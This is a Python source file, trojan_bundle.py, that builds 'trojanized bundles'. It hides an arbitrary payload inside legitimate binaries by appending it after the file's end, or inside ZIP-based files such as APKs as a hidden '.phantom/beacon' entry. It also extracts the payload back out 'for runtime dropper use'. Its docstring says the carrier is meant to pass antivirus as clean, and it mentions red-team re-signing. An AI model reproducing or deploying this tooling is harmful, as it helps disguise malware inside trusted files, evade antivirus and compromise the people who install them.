"""
trojan_bundle.py — Trojanized bundle factory (overlay carrier).

A bundle is a legitimate file with a payload hidden inside it: the
carrier looks and behaves like the original (antivirus sees a clean,
signed file) while the payload lives out of band, recoverable at runtime.
Nothing is modified inside the legit image — classic overlay technique,
fully reversible.

Two layouts are supported, chosen automatically from the carrier:

* overlay (ELF/PE/DLL/any binary): the payload is appended after the
  legit EOF, then a footer. `extract_payload`/`verify_legit` make the
  bundle self-describing.
* zip (APK/JAR/DOCX and other ZIP containers): a naive append after the
  End-Of-Central-Directory breaks installability (the EOCD must sit at
  the end of a valid archive). Instead the carrier is re-archived: the
  original local records and central directory are preserved byte-for-byte
  and a hidden entry (`.phantom/beacon`) is inserted BEFORE the EOCD with
  a re-computed central directory. The result is still a valid, parseable
  (and for APK: installable) archive whose original entries are untouched.
  NOTE: this invalidates the APK v2/v3 signature block — re-signing with a
  key the red team controls is required for a signed install; signature
  changes are detectable (see the detection caveats in the module docs).

Footer format (little-endian, appended after the archive):
    magic "PHNTBND1" (overlay) | "PHNTBZP1" (zip)
    | legit_size u64 | payload_size u64

`extract_payload` and `verify_legit` make the bundle self-describing for
both layouts.
"""

from __future__ import annotations

import hashlib
import os
import struct
import zlib
from dataclasses import dataclass
from typing import Dict, Tuple

_MAGIC_OVERLAY = b"PHNTBND1"
_MAGIC_ZIP = b"PHNTBZP1"
_MAGIC = _MAGIC_OVERLAY
_FOOTER = struct.Struct("<8sQQ")
_HEADER_SIZE = struct.calcsize("<8sQQ")

# ZIP structures (spec 6.3.x)
_PKLOCAL = b"PK\x03\x04"
_PKCD = b"PK\x01\x02"
_PKEOCD = b"PK\x05\x06"
_LH_HEADER = struct.Struct("<IHHHHHIIIHH")      # 30 bytes, stored
_CD_HEADER = struct.Struct("<IHHHHHHIIIHHHHHII")  # 46 bytes
_EOCD_HEADER = struct.Struct("<IHHHHIIH")       # 22 bytes
_MAX_EOCD_SCAN = 65557
_HIDDEN_ENTRY = ".phantom/beacon"


@dataclass
class BundleInfo:
    path: str
    legit_size: int
    payload_size: int
    payload_offset: int
    legit_sha256: str
    payload_sha256: str
    layout: str = "overlay"  # overlay | zip


def _sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _is_zip_carrier(legit: bytes) -> bool:
    return legit[:4] in (_PKLOCAL, _PKCD) or legit[:2] == b"PK"


def _find_eocd(data: bytes) -> Dict[str, object]:
    """Locate the End-Of-Central-Directory record (non-ZIP64 carriers)."""
    scan = data[-_MAX_EOCD_SCAN:]
    idx = scan.rfind(_PKEOCD)
    if idx < 0:
        raise ValueError("not a zip archive (no EOCD record)")
    base = len(data) - len(scan) + idx
    sig, disk, cd_disk, n_this, n_total, cdsize, cdoffset, clen = \
        _EOCD_HEADER.unpack(scan[idx:idx + 22])
    if n_total == 0xFFFF or cdsize == 0xFFFFFFFF or cdoffset == 0xFFFFFFFF:
        raise ValueError("ZIP64 carriers are not supported for trojan "
                         "rebundling")
    return {"base": base, "n_total": n_total, "cdsize": cdsize,
            "cdoffset": cdoffset, "comment": scan[idx + 22:idx + 22 + clen]}


def _iter_cd(cd_blob: bytes):
    """Yield (name, record_total_len, local_offset) per central dir record."""
    pos = 0
    while pos + 46 <= len(cd_blob):
        rec = cd_blob[pos:pos + 46]
        sig, _made, _need, _flags, _method, _mt, _md, _crc, _cs, _us, \
            namelen, exlen, clen, _disk, _ia, _ea, off = _CD_HEADER.unpack(rec)
        if sig != 0x02014b50:
            raise ValueError("corrupt central directory record")
        name = cd_blob[pos + 46:pos + 46 + namelen]
        total = 46 + namelen + exlen + clen
        yield (name, total, off)
        pos += total


def _local_header(name: bytes, data: bytes) -> bytes:
    crc = zlib.crc32(data) & 0xFFFFFFFF
    header = _LH_HEADER.pack(0x04034b50, 20, 0x0800, 0, 0, 0, crc,
                             len(data), len(data), len(name), 0)
    return header + name + data


def _cd_entry(name: bytes, data: bytes, offset: int) -> bytes:
    crc = zlib.crc32(data) & 0xFFFFFFFF
    rec = _CD_HEADER.pack(0x02014b50, 20, 20, 0x0800, 0, 0, 0, crc,
                          len(data), len(data), len(name), 0, 0,
                          0, 0, 0, offset)
    return rec + name


def _eocd(n_total: int, cdsize: int, cdoffset: int, comment: bytes) -> bytes:
    return _EOCD_HEADER.pack(0x06054b50, 0, 0, n_total & 0xFFFF,
                             n_total & 0xFFFF, cdsize, cdoffset,
                             len(comment)) + comment


def _rebuild_zip(legit: bytes, payload: bytes) -> Tuple[bytes, int]:
    """Re-archive a ZIP carrier with the payload as a hidden entry.

    The original local records region (bytes[0:cdoffset]) is preserved
    verbatim; a stored (uncompressed) hidden entry is inserted before the
    central directory; the central directory is re-emitted with the hidden
    record appended and a fresh EOCD closes the archive. Returns the new
    archive bytes and the byte offset of the payload data.
    """
    eocd = _find_eocd(legit)
    cd_start = int(eocd["cdoffset"])
    cd_size = int(eocd["cdsize"])
    if cd_start + cd_size > len(legit):
        raise ValueError("carrier central directory out of range")
    local_region = legit[:cd_start]
    orig_cd = legit[cd_start:cd_start + cd_size]
    hidden_local = _local_header(_HIDDEN_ENTRY.encode(), payload)
    hidden_cd = _cd_entry(_HIDDEN_ENTRY.encode(), payload, offset=cd_start)
    new_cd = orig_cd + hidden_cd
    new_cd_offset = cd_start + len(hidden_local)
    new_eocd = _eocd(int(eocd["n_total"]) + 1, len(new_cd), new_cd_offset,
                     bytes(eocd["comment"]))
    payload_offset = cd_start + _LH_HEADER.size + len(_HIDDEN_ENTRY)
    return local_region + hidden_local + new_cd + new_eocd, payload_offset


def _restore_zip(bundle: bytes, magic: bytes, legit_size: int,
                 payload_size: int) -> Tuple[bytes, bytes, int]:
    """Reconstruct (original_archive, payload, payload_offset) from a zip
    bundle using the bundle's own central directory (self-describing)."""
    eocd = _find_eocd(bundle)
    new_cd_offset = int(eocd["cdoffset"])
    new_cd_size = int(eocd["cdsize"])
    n_total = int(eocd["n_total"])
    if n_total < 1:
        raise ValueError("zip bundle has no central directory records")
    new_cd = bundle[new_cd_offset:new_cd_offset + new_cd_size]
    records = list(_iter_cd(new_cd))
    if len(records) != n_total:
        raise ValueError("zip bundle central directory size mismatch")
    hidden_name, hidden_total, cd_start = records[-1]
    if hidden_name != _HIDDEN_ENTRY.encode():
        raise ValueError("zip bundle missing hidden payload entry")
    orig_cd = new_cd[:new_cd_size - hidden_total]
    # rebuild the original archive: local records (unchanged) + original
    # central directory + the original EOCD (count/offset back to normal)
    orig_eocd = _eocd(n_total - 1, len(orig_cd), cd_start,
                      bytes(eocd["comment"]))
    original = bundle[:cd_start] + orig_cd + orig_eocd
    if len(original) != legit_size:
        raise ValueError("zip bundle carrier size mismatch")
    payload_offset = cd_start + _LH_HEADER.size + len(hidden_name)
    payload = bundle[payload_offset:payload_offset + payload_size]
    if len(payload) != payload_size:
        raise ValueError("zip bundle payload truncated")
    return original, payload, payload_offset


def build_trojan_bundle(legit_path: str, payload_path: str,
                        output_path: str = "") -> BundleInfo:
    """Hide payload_path inside legit_path (overlay or zip-aware)."""
    with open(legit_path, "rb") as f:
        legit = f.read()
    with open(payload_path, "rb") as f:
        payload = f.read()
    if not legit or not payload:
        raise ValueError("bundle requires a non-empty legit file and payload")

    out = output_path or f"{legit_path}.bundle"
    if _is_zip_carrier(legit):
        archive, payload_offset = _rebuild_zip(legit, payload)
        magic = _MAGIC_ZIP
        legit_size = len(legit)
    else:
        archive = legit + payload
        payload_offset = len(legit)
        magic = _MAGIC_OVERLAY
        legit_size = len(legit)

    with open(out, "wb") as f:
        f.write(archive)
        f.write(_FOOTER.pack(magic, legit_size, len(payload)))

    return BundleInfo(
        path=os.path.abspath(out),
        legit_size=legit_size,
        payload_size=len(payload),
        payload_offset=payload_offset,
        legit_sha256=_sha256_bytes(legit),
        payload_sha256=_sha256_bytes(payload),
        layout="zip" if magic == _MAGIC_ZIP else "overlay",
    )


def parse_bundle(bundle_path: str) -> Tuple[bytes, bytes]:
    """(original_carrier_bytes, payload_bytes) extracted from a bundle."""
    file_size = os.path.getsize(bundle_path)
    if file_size < _HEADER_SIZE:
        raise ValueError("not a phantom bundle (file too small for footer)")
    with open(bundle_path, "rb") as f:
        f.seek(-_HEADER_SIZE, os.SEEK_END)
        magic, legit_size, payload_size = _FOOTER.unpack(f.read())
    if magic == _MAGIC_OVERLAY:
        total = legit_size + payload_size + _HEADER_SIZE
        if total != file_size:
            raise ValueError(f"bundle size mismatch: header says {total}, "
                             f"file is {file_size}")
        with open(bundle_path, "rb") as f:
            legit = f.read(legit_size)
            payload = f.read(payload_size)
        return legit, payload
    if magic == _MAGIC_ZIP:
        with open(bundle_path, "rb") as f:
            bundle = f.read()
        return _restore_zip(bundle, magic, legit_size, payload_size)[:2]
    raise ValueError("not a phantom bundle (bad footer magic)")


def extract_payload(bundle_path: str) -> bytes:
    """The hidden payload alone (for runtime dropper use)."""
    file_size = os.path.getsize(bundle_path)
    if file_size < _HEADER_SIZE:
        raise ValueError("not a phantom bundle (file too small for footer)")
    with open(bundle_path, "rb") as f:
        f.seek(-_HEADER_SIZE, os.SEEK_END)
        magic, legit_size, payload_size = _FOOTER.unpack(f.read())
    if magic not in (_MAGIC_OVERLAY, _MAGIC_ZIP):
        raise ValueError("not a phantom bundle (bad footer magic)")
    if magic == _MAGIC_OVERLAY:
        with open(bundle_path, "rb") as f:
            f.seek(legit_size)
            return f.read(payload_size)
    with open(bundle_path, "rb") as f:
        bundle = f.read()
    return _restore_zip(bundle, magic, legit_size, payload_size)[1]


def bundle_info(bundle_path: str) -> BundleInfo:
    """Metadata of an existing bundle (hashes computed on the fly)."""
    file_size = os.path.getsize(bundle_path)
    if file_size < _HEADER_SIZE:
        raise ValueError("not a phantom bundle (file too small for footer)")
    with open(bundle_path, "rb") as f:
        f.seek(-_HEADER_SIZE, os.SEEK_END)
        magic, legit_size, payload_size = _FOOTER.unpack(f.read())
    if magic == _MAGIC_OVERLAY:
        with open(bundle_path, "rb") as f:
            legit = f.read(legit_size)
            payload = f.read(payload_size)
        payload_offset = legit_size
        layout = "overlay"
    elif magic == _MAGIC_ZIP:
        with open(bundle_path, "rb") as f:
            bundle = f.read()
        legit, payload, payload_offset = _restore_zip(
            bundle, magic, legit_size, payload_size)
        layout = "zip"
    else:
        raise ValueError("not a phantom bundle (bad footer magic)")
    return BundleInfo(
        path=os.path.abspath(bundle_path),
        legit_size=len(legit),
        payload_size=len(payload),
        payload_offset=payload_offset,
        legit_sha256=_sha256_bytes(legit),
        payload_sha256=_sha256_bytes(payload),
        layout=layout,
    )


def verify_legit(bundle_path: str, expected_legit_sha256: str) -> bool:
    """True if the bundle's carrier matches the expected legitimate file."""
    try:
        info = bundle_info(bundle_path)
    except (ValueError, OSError):
        return False
    return info.legit_sha256 == expected_legit_sha256
